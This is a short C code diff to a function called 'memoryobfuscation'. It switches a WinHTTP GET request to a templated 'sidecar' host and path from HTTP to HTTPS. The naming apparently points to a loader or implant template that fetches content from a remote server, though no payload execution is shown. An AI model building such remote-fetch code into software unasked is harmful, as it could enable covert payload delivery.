@@ -163,10 +163,10 @@ void memoryobfuscation(){
     HINTERNET hSession = WinHttpOpen(L"MyAgent", 1, NULL, NULL, 0); // INTERNET_OPEN_TYPE_PRECONFIG = 1
     if (!hSession) return;
     
-    HINTERNET hConnect = WinHttpConnect(hSession, L"{{SIDECAR_DOMAIN}}", 80, 0); // 443 for HTTPS
+    HINTERNET hConnect = WinHttpConnect(hSession, L"{{SIDECAR_DOMAIN}}", 443, 0); // 443 for HTTPS
     if (!hConnect) return;
      
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"{{SIDECAR_PATH}}", NULL, NULL, NULL, NULL); //,WINHTTP_FLAG_SECURE);
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"{{SIDECAR_PATH}}", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
     if (!hRequest) return;
     
     if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) return;
